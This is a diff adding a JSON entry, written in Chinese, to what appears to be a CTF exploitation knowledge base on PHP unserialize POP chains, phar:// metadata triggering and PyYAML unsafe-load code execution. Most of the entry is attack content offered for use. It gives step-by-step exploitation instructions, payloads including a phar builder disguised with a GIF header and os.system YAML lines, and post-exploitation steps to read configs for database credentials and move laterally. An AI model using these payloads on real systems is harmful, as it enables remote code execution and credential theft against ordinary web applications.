@@ -1,0 +1,58 @@
+{
+ "id": "web-php-deserialize-phar-yaml",
+ "title": "PHP/Python 反序列化族:unserialize POP 链、phar:// 触发、PyYAML unsafe load",
+ "vuln_pattern": "序列化对象被服务端反序列化:PHP unserialize(cookie base64/表单)、phar:// 流包装器触发 metadata 反序列化、Python PyYAML 非 safe Loader 执行任意对象构造",
+ "fingerprint": [
+  "unserialize",
+  "PHP反序列化",
+  "POP链",
+  "__destruct",
+  "__wakeup",
+  "phar://",
+  "pyyaml",
+  "yaml.load",
+  "!!python/object",
+  "O:8:",
+  "cookie反序列化"
+ ],
+ "exploit_steps": [
+  "识别入口:PHP 侧 unserialize(base64_decode($_COOKIE[...])) / unserialize($_POST[...]);Python 侧 yaml.load(x, Loader=yaml.Loader)(非 safe_load)。给源码就读 sink 找 gadget 类;没源码先用类型探针(O:8:\"stdClass\":0:{} 报错差异)确认反序列化发生。",
+  "PHP POP 链构造三步:①找有 __destruct/__wakeup/__toString 的类(应用自己的类优先,公开 gadget 的 PHP 通用库次之);②沿'魔术方法 A 调用的属性方法'链(如 __destruct → unset($this->file) → FileHandler::__toString → read($this->path));③写 PHP 生成器脚本 echo serialize(new X()) 输出串,改属性名/长度后 base64 进 cookie。",
+  "属性绕过:私有/受保护属性序列化带 \\x00 前缀(\\0X\\0name),URL/cookie 传输时保持 %00;PHP 7.1+ 对属性访问级别宽松(protected 可当 public 喂)。",
+  "phar:// 触发(不需要 unserialize 调用!):上传合法图片/任意文件,phar 的 metadata 里塞序列化对象;任何文件函数(file_get_contents/file_exists/getimagesize/fopen)以 phar://路径/x.jpg 打开时就反序列化 metadata——找应用里'用户可控路径进文件函数'的点。生成:PHP 写 phar(PHP_INTEGER_SIZE 兼容,用 PHP_SELF 打包器或现成 phar gg 工具)。",
+  "PyYAML:yaml.load(input, Loader=UnsafeLoader/Loader) 时,!!python/object/apply:os.system [cat /flag] 直接执行;yaml 5.1+ 默认 FullLoader 时试 !!python/name 与对象构造受限面,确认 Loader 类型再选 payload。",
+  "命中后固定收割:id;env;find / -name 'flag*';读 web 根配置拿 DB 凭据(下一步横向)。"
+ ],
+ "key_payloads": [
+  "# PHP POP 生成器骨架\nclass FileHandler { public $path = '/flag'; function __destruct(){ echo file_get_contents($this->path); } }\necho serialize(new FileHandler());  // O:11:\"FileHandler\":1:{s:4:\"path\";s:5:\"/flag\";}\n# 进 cookie: base64 后替换, 注意 %00 私有属性",
+  "# phar metadata 构造\n$phar = new Phar('/tmp/x.phar'); $phar->startBuffering(); $phar->setStub('GIF89a<?php __HALT_COMPILER();');\n$phar->setMetadata(new FileHandler()); $phar->addFromString('a.txt','x'); $phar->stopBuffering();\n# 触发: file_exists('phar:///uploads/x.gif') 等文件函数",
+  "# PyYAML RCE\n!!python/object/apply:os.system ['cat /flag']\n!!python/object/apply:subprocess.check_output [['cat','/flag']]"
+ ],
+ "category": "web",
+ "cve": [],
+ "tags": [
+  "php-deserialization",
+  "pop-chain",
+  "phar",
+  "pyyaml",
+  "unsafe-load",
+  "magic-methods",
+  "rce"
+ ],
+ "source": "writeup 提炼(CTF 实战实例分析)",
+ "source_tier": "seed",
+ "preconditions": [
+  "PHP: unserialize 的输入可控(cookie/POST/文件导入)",
+  "或存在用户可控路径进入文件函数且能上传文件(phar://)",
+  "Python: yaml.load 非 safe Loader"
+ ],
+ "verify_oracle": "构造的序列化对象触发目标类魔术方法(RCE 输出/文件内容回显),unserialize 后响应出现非模板文本",
+ "pitfalls": [
+  "没有应用源码时硬套通用 gadget(Monolog/Laravel)——靶场常是自写小类,先读源码找 __destruct 再谈链",
+  "phar 需要 phar.readonly=Off 才能用 PHP 生成——生成环境不行就在本地/容器里生成再上传成品",
+  "序列化串的长度字段改了内容必须同步改数字,长度错一位 PHP 直接拒",
+  "PyYAML 6.x 里 yaml.load(x) 不带 Loader 参数已默认 safe——确认题目 Loader 才有 UnsafeLoader 面"
+ ],
+ "anti_fingerprint": [],
+ "created_ts": 0.0
+}
